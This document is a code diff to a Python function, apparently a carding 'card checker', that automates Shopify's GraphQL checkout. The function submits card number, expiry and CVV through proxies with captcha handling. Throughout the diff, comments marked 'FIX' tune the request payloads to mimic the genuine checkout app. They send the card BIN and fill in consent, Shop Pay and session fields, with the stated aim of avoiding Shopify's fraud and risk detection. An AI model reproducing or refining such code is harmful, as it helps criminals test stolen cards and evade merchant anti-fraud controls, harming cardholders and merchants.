@@ -1485,8 +1485,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                 'streetAddress': {
                                     'address1': street, 'address2': address2, 'city': city,
                                     'countryCode': country_code, 'postalCode': s_zip,
-                                    'firstName': firstName, 'lastName': lastName,
-                                    'zoneCode': state, 'phone': phone
+                                    'company': '', 'firstName': firstName, 'lastName': lastName,
+                                    'zoneCode': state, 'phone': phone, 'oneTimeUse': False
                                 }
                             },
                             'selectedDeliveryStrategy': {
@@ -1503,7 +1503,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         }],
                         'noDeliveryRequired': [],
                         'useProgressiveRates': False,
-                        'prefetchShippingRatesStrategy': None
+                        'prefetchShippingRatesStrategy': None,
+                        'supportsSplitShipping': True
                     },
                     'deliveryExpectations': {'deliveryExpectationLines': []},
                     'merchandise': {
@@ -1524,21 +1525,28 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             'lineComponents': []
                         }]
                     },
+                    'memberships': {'memberships': []},
                     'payment': {
                         'totalAmount': {'any': True},
                         'paymentLines': [],
                         'billingAddress': {
                             'streetAddress': {
                                 'address1': '', 'address2': '', 'city': '', 'countryCode': country_code,
-                                'postalCode': '', 'firstName': '', 'lastName': '', 'zoneCode': state, 'phone': ''
+                                'postalCode': '', 'company': '', 'firstName': '', 'lastName': '', 'zoneCode': state, 'phone': ''
                             }
                         }
                     },
                     'buyerIdentity': {
                         'buyerIdentity': {'presentmentCurrency': currency, 'countryCode': country_code},
                         'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}},
-                        'marketingConsent': [{'email': {'value': email}}],
-                        'shopPayOptInPhone': {'countryCode': country_code},
+                        'marketingConsent': [
+                            {'sms': {'consentState': 'DECLINED', 'value': phone, 'countryCode': country_code}},
+                            {'email': {'consentState': 'GRANTED', 'value': email}}
+                        ],
+                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
+                        'phoneCountryCode': country_code,
+                        'rememberMe': False,
+                        'setShippingAddressAsDefault': False
                     },
                     'tip': {'tipLines': []},
                     'taxes': {
@@ -1548,8 +1556,21 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'proposedMixedStateTotalAmount': None,
                         'proposedExemptions': []
                     },
-                    'note': {'message': None, 'customAttributes': []},
+                    'note': {
+                        'message': None,
+                        'customAttributes': [
+                            {'key': 'gorgias.guest_id', 'value': ''},
+                            {'key': 'gorgias.session_id', 'value': ''}
+                        ]
+                    },
                     'localizationExtension': {'fields': []},
+                    'shopPayArtifact': {
+                        'optIn': {
+                            'vaultEmail': '',
+                            'vaultPhone': phone,
+                            'optInSource': 'REMEMBER_ME'
+                        }
+                    },
                     'nonNegotiableTerms': None,
                     'scriptFingerprint': {
                         'signature': None,
@@ -1558,7 +1579,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'paymentScriptChanges': [],
                         'shippingScriptChanges': []
                     },
-                    'optionalDuties': {'buyerRefusesDuties': False}
+                    'optionalDuties': {'buyerRefusesDuties': False},
+                    'captcha': None,
+                    'cartMetafields': []
                 },
                 'operationName': 'Proposal'
             }
@@ -1922,20 +1945,21 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'streetAddress': {
                     'address1': street, 'address2': address2, 'city': city,
                     'countryCode': country_code, 'postalCode': s_zip,
-                    'firstName': firstName, 'lastName': lastName,
-                    'zoneCode': state, 'phone': phone
+                    'company': '', 'firstName': firstName, 'lastName': lastName,
+                    'zoneCode': state, 'phone': phone, 'oneTimeUse': False
                 }
             }
             json_data['variables']['payment']['billingAddress'] = {
                 'streetAddress': {
                     'address1': street, 'address2': address2, 'city': city,
                     'countryCode': country_code, 'postalCode': s_zip,
-                    'firstName': firstName, 'lastName': lastName,
+                    'company': '', 'firstName': firstName, 'lastName': lastName,
                     'zoneCode': state, 'phone': phone
                 }
             }
             json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
-            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['countryCode'] = country_code
+            # FIX: Update shopPayOptInPhone with both number and countryCode
+            json_data['variables']['buyerIdentity']['shopPayOptInPhone'] = {'number': phone, 'countryCode': country_code}
 
             # FIX: Pass proxy=proxy for delivery proposal GraphQL request
             response, resp_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
@@ -2130,6 +2154,26 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             params = {'operationName': 'SubmitForCompletion'}
             
+            # FIX: Extract BIN (first 8 digits) from card number for fraud scoring.
+            # Shopify's checkout web app sends creditCardBin in the payment input.
+            # Missing BIN = immediate red flag for Shopify's risk detection system.
+            _raw_cc = cc.replace(' ', '').replace('-', '')
+            _card_bin = _raw_cc[:8] if len(_raw_cc) >= 8 else _raw_cc
+            
+            # FIX: Extract delivery signed handles from proposal response for
+            # deliveryExpectations. The real checkout web app sends these after
+            # the proposal step to validate the pre-negotiated delivery strategy.
+            _delivery_expectation_lines = []
+            if delivery_data:
+                _deliv_lines = delivery_data.get('deliveryLines', []) if isinstance(delivery_data, dict) else []
+                if _deliv_lines:
+                    for _dl in _deliv_lines:
+                        _avail_strats = _dl.get('availableDeliveryStrategies', [])
+                        for _astrat in _avail_strats:
+                            _sh = _astrat.get('signedHandle')
+                            if _sh:
+                                _delivery_expectation_lines.append({'signedHandle': _sh})
+            
             submit_variables = {
                 'input': {
                     'sessionInput': {'sessionToken': sst},
@@ -2141,8 +2185,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                 'streetAddress': {
                                     'address1': street, 'address2': address2, 'city': city,
                                     'countryCode': country_code, 'postalCode': s_zip,
-                                    'firstName': firstName, 'lastName': lastName,
-                                    'zoneCode': state, 'phone': phone
+                                    'company': '', 'firstName': firstName, 'lastName': lastName,
+                                    'zoneCode': state, 'phone': phone, 'oneTimeUse': False
                                 }
                             },
                             'selectedDeliveryStrategy': {
@@ -2150,20 +2194,22 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                     'estimatedTimeInTransit': {'any': True},
                                     'shipments': {'any': True}
                                 },
-                                'options': {}
+                                'options': {'phone': phone}
                             },
                             'targetMerchandiseLines': {
                                 'lines': [{'stableId': stableId or '1'}]
                             },
                             'deliveryMethodTypes': ['SHIPPING'],
-                            'expectedTotalPrice': {
-                                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
-                            },
+                            'expectedTotalPrice': {'any': True},
                             'destinationChanged': False
                         }],
                         'noDeliveryRequired': [],
                         'useProgressiveRates': False,
-                        'prefetchShippingRatesStrategy': None
+                        'prefetchShippingRatesStrategy': None,
+                        'supportsSplitShipping': True
+                    },
+                    'deliveryExpectations': {
+                        'deliveryExpectationLines': _delivery_expectation_lines
                     },
                     'merchandise': {
                         'merchandiseLines': [{
@@ -2183,6 +2229,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             'lineComponents': []
                         }]
                     },
+                    'memberships': {'memberships': []},
                     'payment': {
                         'totalAmount': {'any': True},
                         'paymentLines': [{
@@ -2194,32 +2241,62 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                         'streetAddress': {
                                             'address1': street, 'address2': address2,
                                             'city': city, 'countryCode': country_code,
-                                            'postalCode': s_zip, 'firstName': firstName,
+                                            'postalCode': s_zip, 'company': '',
+                                            'firstName': firstName,
                                             'lastName': lastName, 'zoneCode': state,
                                             'phone': phone
                                         }
                                     },
                                     'cardSource': None
-                                }
+                                },
+                                # FIX: Shopify's GraphQL PaymentMethodInput is a union type.
+                                # When using directPaymentMethod, the schema expects ALL other
+                                # payment method variant fields to be explicitly set to null to
+                                # disambiguate. Missing null fields can cause InputValidationError.
+                                'giftCardPaymentMethod': None,
+                                'redeemablePaymentMethod': None,
+                                'walletPaymentMethod': None,
+                                'walletsPlatformPaymentMethod': None,
+                                'localPaymentMethod': None,
+                                'paymentOnDeliveryMethod': None,
+                                'paymentOnDeliveryMethod2': None,
+                                'manualPaymentMethod': None,
+                                'customPaymentMethod': None,
+                                'offsitePaymentMethod': None,
+                                'customOnsitePaymentMethod': None,
+                                'deferredPaymentMethod': None,
+                                'customerCreditCardPaymentMethod': None,
+                                'paypalBillingAgreementPaymentMethod': None,
+                                'remotePaymentInstrument': None
                             },
-                            'amount': {'any': True},
-                            'dueAt': None
+                            'amount': {'any': True}
                         }],
                         'billingAddress': {
                             'streetAddress': {
                                 'address1': street, 'address2': address2,
                                 'city': city, 'countryCode': country_code,
-                                'postalCode': s_zip, 'firstName': firstName,
+                                'postalCode': s_zip, 'company': '',
+                                'firstName': firstName,
                                 'lastName': lastName, 'zoneCode': state,
                                 'phone': phone
                             }
-                        }
+                        },
+                        'creditCardBin': _card_bin
                     },
                     'buyerIdentity': {
                         'buyerIdentity': {'presentmentCurrency': currency, 'countryCode': country_code},
                         'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}},
-                        'marketingConsent': [{'email': {'value': email}}],
-                        'shopPayOptInPhone': {'countryCode': country_code},
+                        # FIX: Full marketingConsent format matching real checkout web app.
+                        # Must include consentState (GRANTED/DECLINED) and both email + SMS entries.
+                        'marketingConsent': [
+                            {'sms': {'consentState': 'DECLINED', 'value': phone, 'countryCode': country_code}},
+                            {'email': {'consentState': 'GRANTED', 'value': email}}
+                        ],
+                        # FIX: shopPayOptInPhone must include the phone number, not just countryCode.
+                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
+                        'phoneCountryCode': country_code,
+                        'rememberMe': False,
+                        'setShippingAddressAsDefault': False
                     },
                     'taxes': {
                         'proposedAllocations': None,
@@ -2229,8 +2306,21 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'proposedExemptions': []
                     },
                     'tip': {'tipLines': []},
-                    'note': {'message': None, 'customAttributes': []},
+                    'note': {
+                        'message': None,
+                        'customAttributes': [
+                            {'key': 'gorgias.guest_id', 'value': ''},
+                            {'key': 'gorgias.session_id', 'value': ''}
+                        ]
+                    },
                     'localizationExtension': {'fields': []},
+                    'shopPayArtifact': {
+                        'optIn': {
+                            'vaultEmail': '',
+                            'vaultPhone': phone,
+                            'optInSource': 'REMEMBER_ME'
+                        }
+                    },
                     'nonNegotiableTerms': None,
                     'scriptFingerprint': {
                         'signature': None,
@@ -2239,7 +2329,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'paymentScriptChanges': [],
                         'shippingScriptChanges': []
                     },
-                    'optionalDuties': {'buyerRefusesDuties': False}
+                    'optionalDuties': {'buyerRefusesDuties': False},
+                    'captcha': None,
+                    'cartMetafields': []
                 },
                 'attemptToken': attempt_token,
                 'metafields': [],
